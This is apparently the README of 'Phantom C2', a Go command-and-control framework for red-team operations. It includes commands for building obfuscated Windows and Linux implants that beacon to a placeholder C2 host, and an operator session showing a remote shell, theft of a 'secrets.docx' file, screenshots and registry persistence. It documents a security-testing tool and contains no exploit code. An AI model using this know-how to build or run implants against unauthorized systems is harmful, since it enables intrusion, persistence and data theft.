# Phantom C2

<p align="center">
  <img src="docs/assets/phantom-banner.png" alt="Phantom C2" width="600"/>
</p>

<p align="center">
  <strong>A modern Command & Control framework for authorized red team operations</strong>
</p>

<p align="center">
  <a href="#features">Features</a> |
  <a href="#quickstart">Quickstart</a> |
  <a href="#architecture">Architecture</a> |
  <a href="#usage">Usage</a> |
  <a href="#building-agents">Building Agents</a> |
  <a href="#disclaimer">Disclaimer</a>
</p>

---

## Features

- Beautiful terminal UI built with [Bubbletea](https://github.com/charmbracelet/bubbletea) + [Lipgloss](https://github.com/charmbracelet/lipgloss)
- Cross-platform agents (Windows & Linux)
- Encrypted communications (RSA key exchange + AES-256-GCM)
- HTTP/HTTPS listeners with malleable communication profiles
- Multi-agent management with real-time status tracking
- Interactive shell, file transfer, screenshots, process listing
- Multiple persistence mechanisms per platform
- Agent builder with cross-compilation and optional obfuscation via [garble](https://github.com/burrowers/garble)
- SQLite-backed persistence for operations data
- Modular, extensible architecture

## Quickstart

### Prerequisites

- Go 1.22+
- Make
- (Optional) [garble](https://github.com/burrowers/garble) for agent obfuscation

### Build the Server

```bash
git clone https://github.com/phantom-c2/phantom.git
cd phantom
make deps
make keygen
make server
```

### Run the Server

```bash
./build/phantom-server --config configs/server.yaml
```

### Build an Agent

```bash
# Windows agent
make agent-windows LISTENER_URL=https://your-c2.com:443 SLEEP=10 JITTER=20

# Linux agent
make agent-linux LISTENER_URL=https://your-c2.com:443 SLEEP=10 JITTER=20

# Obfuscated Windows agent
make agent-garble-windows LISTENER_URL=https://your-c2.com:443 SLEEP=10 JITTER=20
```

Or use the built-in **Builder** panel in the TUI.

## Architecture

```
                    +-------------------+
                    |   Phantom Server  |
                    |                   |
                    |  +-------------+  |
  Operator  <------>  |     TUI     |  |
  (Terminal)        |  +------+------+  |
                    |         |         |
                    |  +------v------+  |
                    |  | Task Queue  |  |
                    |  +------+------+  |
                    |         |         |
                    |  +------v------+  |
                    |  |  Listeners  |  |
                    |  |  HTTP/HTTPS |  |
                    |  +------+------+  |
                    +---------|----------+
                              |
                    RSA + AES-256-GCM
                              |
              +---------------+---------------+
              |                               |
      +-------v-------+             +---------v-----+
      | Windows Agent |             |  Linux Agent  |
      |  (implant)    |             |  (implant)    |
      +---------------+             +---------------+
```

### Communication Protocol

1. **Registration**: Agent generates AES-256 session key, encrypts it with server's RSA public key (embedded at compile time), sends along with system info
2. **Check-in Loop**: Agent sleeps (with jitter), sends AES-encrypted check-in, receives queued tasks, executes them, returns results on next check-in
3. **Wire Format**: Encrypted payloads are msgpack-serialized, base64-encoded, and wrapped in JSON to blend with normal API traffic

### Technology Stack

| Component | Technology |
|-----------|------------|
| Language | Go 1.22+ |
| TUI | Bubbletea + Lipgloss + Bubbles |
| Database | SQLite (pure-Go via modernc.org/sqlite) |
| Serialization | msgpack |
| Encryption | RSA-2048 + AES-256-GCM |
| Agent Obfuscation | garble (optional) |

## Usage

### TUI Navigation

| Key | Action |
|-----|--------|
| `Tab` / `Shift+Tab` | Switch panels |
| `1-6` | Jump to panel |
| `/` | Focus command input |
| `Enter` | Select / confirm |
| `Esc` | Back / cancel |
| `?` | Toggle help |
| `j/k` | Navigate tables |
| `q` | Quit |

### Command Interface

```
phantom> listeners start --name https-main --type https --bind 0.0.0.0:443
phantom> interact silent-falcon
phantom(silent-falcon)> shell whoami
phantom(silent-falcon)> download C:\Users\admin\Desktop\secrets.docx
phantom(silent-falcon)> screenshot
phantom(silent-falcon)> persist registry
phantom(silent-falcon)> sleep 30 25
phantom(silent-falcon)> back
phantom> builder --os windows --arch amd64 --listener https-main
```

### Agent Capabilities

| Capability | Windows | Linux | Command |
|-----------|---------|-------|---------|
| Shell Execution | cmd.exe | /bin/sh | `shell <command>` |
| File Upload | Yes | Yes | `upload <local> <remote>` |
| File Download | Yes | Yes | `download <remote>` |
| Screenshot | GDI API | xdotool | `screenshot` |
| Process List | ToolHelp32 | /proc | `ps` |
| System Info | WMI | /proc + uname | `sysinfo` |
| Persistence | Registry, Schtask | Cron, systemd, .bashrc | `persist <method>` |
| Change Directory | Yes | Yes | `cd <path>` |
| Sleep/Jitter | Yes | Yes | `sleep <seconds> <jitter%>` |
| Self-destruct | Yes | Yes | `kill` |

## Building Agents

### From the Command Line

```bash
# Standard build
make agent-windows LISTENER_URL=https://10.0.0.1:443 SLEEP=10 JITTER=20

# With garble obfuscation
make agent-garble-windows LISTENER_URL=https://10.0.0.1:443 SLEEP=10 JITTER=20

# All platforms
make agent-all LISTENER_URL=https://10.0.0.1:443 SLEEP=10 JITTER=20
```

### From the TUI

Navigate to the **Builder** panel (press `5`), fill in the form, and press Build.

## Project Structure

```
phantom/
  cmd/
    server/       Server entrypoint
    agent/        Agent entrypoint
    keygen/       RSA keypair generator
  internal/
    server/       Core server logic
    listener/     HTTP/HTTPS listeners + profiles
    agent/        Agent manager + builder
    task/         Task dispatcher + queues
    crypto/       RSA, AES-256-GCM, key exchange
    protocol/     Wire protocol messages + serialization
    db/           SQLite database + repositories
    tui/          Terminal UI (bubbletea)
    implant/      Agent-side code (compiled separately)
    util/         Shared utilities
  configs/        Server config + malleable profiles
  scripts/        Helper scripts
  docs/           Documentation
```

## Disclaimer

**This tool is designed for authorized red team engagements and security research only.**

Unauthorized access to computer systems is illegal. You are responsible for ensuring you have proper authorization before using this tool. The author accepts no liability for misuse.

Always:
- Obtain written authorization before testing
- Follow your organization's rules of engagement
- Document all activities
- Report findings responsibly

## Author

**Opeyemi Kolawole** - [GitHub](https://github.com/phantom-c2)

## License

BSD 3-Clause License - see [LICENSE](LICENSE) for details.
